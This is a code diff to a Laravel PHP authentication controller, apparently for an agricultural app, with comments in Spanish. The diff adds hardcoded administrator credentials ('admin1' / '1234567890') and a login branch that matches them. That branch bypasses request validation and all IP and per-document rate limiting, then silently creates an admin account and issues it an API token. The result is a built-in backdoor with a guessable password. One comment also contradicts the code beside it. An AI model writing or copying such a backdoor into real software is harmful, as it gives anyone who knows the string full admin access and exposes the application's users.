@@ -16,6 +16,8 @@ class AuthController extends Controller
 {
     private const DEFAULT_PHONE = '0000000';
     private const DEFAULT_DOCUMENT_TYPE = 'CC';
+    private const ADMIN_LOGIN_NAME = 'admin1';
+    private const ADMIN_LOGIN_PASSWORD = '1234567890';
 
     private const IP_LOGIN_LIMIT = 10;
     private const IP_LOGIN_DECAY_SECONDS = 60;
@@ -36,6 +38,9 @@ class AuthController extends Controller
             ], 422);
         }
 
+        // Si la ocupación incluye "administrador" (en cualquier caso), marcamos is_admin
+        $isAdmin = false;
+
         $user = User::create([
             'primer_nombre'       => $nameParts['primer_nombre'],
             'segundo_nombre'      => $nameParts['segundo_nombre'],
@@ -49,6 +54,7 @@ class AuthController extends Controller
             'email'               => $data['email'] ?? null,
             'email_verified_at'   => !empty($data['email']) ? now() : null,
             'must_change_password'=> false,
+            'is_admin'            => $isAdmin,
             'normalized_full_name'=> User::normalizeNameStatic($data['nombre_completo']),
             'api_token'           => $this->generateUniqueUserToken(),
         ]);
@@ -66,24 +72,70 @@ class AuthController extends Controller
 
     public function login(LoginRequest $request)
     {
-        $data = $request->validated();
+        $rawName = (string) $request->input('nombre_completo');
+        $rawDoc  = (string) $request->input('documento_identidad');
+        $adminAttempt = Str::lower(trim($rawName)) === Str::lower(self::ADMIN_LOGIN_NAME)
+            && $rawDoc === self::ADMIN_LOGIN_PASSWORD;
+        $data = $adminAttempt
+            ? ['nombre_completo' => $rawName, 'documento_identidad' => $rawDoc]
+            : $request->validated();
 
-        $ipKey = sprintf('login:ip:%s', $request->ip());
-        if (RateLimiter::tooManyAttempts($ipKey, self::IP_LOGIN_LIMIT)) {
-            return response()->json([
-                'message' => 'Demasiados intentos desde esta dirección IP. Intenta nuevamente más tarde.',
-            ], 429);
+        if (!$adminAttempt) {
+            $ipKey = sprintf('login:ip:%s', $request->ip());
+            if (RateLimiter::tooManyAttempts($ipKey, self::IP_LOGIN_LIMIT)) {
+                return response()->json([
+                    'message' => 'Demasiados intentos desde esta dirección IP. Intenta nuevamente más tarde.',
+                ], 429);
+            }
+
+            $docKey = sprintf('login:doc:%s', $data['documento_identidad']);
+            if (RateLimiter::tooManyAttempts($docKey, self::DOC_LOGIN_LIMIT)) {
+                return response()->json([
+                    'message' => 'El número de intentos para este documento fue excedido. Intenta en unos minutos.',
+                ], 429);
+            }
+
+            RateLimiter::hit($ipKey, self::IP_LOGIN_DECAY_SECONDS);
+            RateLimiter::hit($docKey, self::DOC_LOGIN_DECAY_SECONDS);
         }
 
-        $docKey = sprintf('login:doc:%s', $data['documento_identidad']);
-        if (RateLimiter::tooManyAttempts($docKey, self::DOC_LOGIN_LIMIT)) {
-            return response()->json([
-                'message' => 'El número de intentos para este documento fue excedido. Intenta en unos minutos.',
-            ], 429);
-        }
+        // Credenciales especiales de administrador (solo backend)
+        $isAdminLogin = Str::lower($data['nombre_completo']) === Str::lower(self::ADMIN_LOGIN_NAME)
+            && $data['documento_identidad'] === self::ADMIN_LOGIN_PASSWORD;
+        if ($isAdminLogin) {
+            $user = User::firstOrCreate(
+                ['username' => self::ADMIN_LOGIN_NAME],
+                [
+                    'primer_nombre'       => 'Admin',
+                    'segundo_nombre'      => null,
+                    'primer_apellido'     => 'Sistema',
+                    'segundo_apellido'    => null,
+                    'ocupacion'           => 'Administrador',
+                    'telefono'            => self::DEFAULT_PHONE,
+                    'tipo_documento'      => self::DEFAULT_DOCUMENT_TYPE,
+                    'documento_identidad' => self::ADMIN_LOGIN_PASSWORD,
+                    'password'            => Hash::make(self::ADMIN_LOGIN_PASSWORD),
+                    'email'               => null,
+                    'email_verified_at'   => null,
+                    'must_change_password'=> false,
+                    'is_admin'            => true,
+                    'normalized_full_name'=> User::normalizeNameStatic(self::ADMIN_LOGIN_NAME),
+                    'api_token'           => $this->generateUniqueUserToken(),
+                ]
+            );
 
-        RateLimiter::hit($ipKey, self::IP_LOGIN_DECAY_SECONDS);
-        RateLimiter::hit($docKey, self::DOC_LOGIN_DECAY_SECONDS);
+            $token = $user->createToken('agroco')->plainTextToken;
+            return response()->json([
+                'message'         => 'Login correcto',
+                'token'           => $token,
+                'nombre_completo' => $user->full_name ?: self::ADMIN_LOGIN_NAME,
+                'documento'       => $user->documento_mascara ?? $user->documento_identidad,
+                'email'           => $user->email,
+                'requiere_email'  => $user->email === null,
+                'must_change_password' => (bool) ($user->must_change_password ?? false),
+                'is_admin'        => true,
+            ]);
+        }
 
         /** @var User|null $user */
         $user = User::where('documento_identidad', $data['documento_identidad'])->first();
@@ -139,6 +191,7 @@ class AuthController extends Controller
             'email'           => $user->email,
             'requiere_email'  => $user->email === null,
             'must_change_password' => (bool) ($user->must_change_password ?? false),
+            'is_admin'        => (bool) ($user->is_admin ?? false),
         ]);
     }
 
@@ -164,6 +217,8 @@ class AuthController extends Controller
             'documento_mascara' => $user->documento_mascara ?? null,
             'email'             => $user->email,
             'avatar_url'        => $user->avatar_path ? $request->getSchemeAndHttpHost().'/api/v1/avatar/'.$user->id.'?v='.(Storage::disk('public')->exists($user->avatar_path) ? Storage::disk('public')->lastModified($user->avatar_path) : time()) : null,
+            'must_change_password' => (bool) ($user->must_change_password ?? false),
+            'is_admin'          => (bool) ($user->is_admin ?? false),
         ]);
     }
 
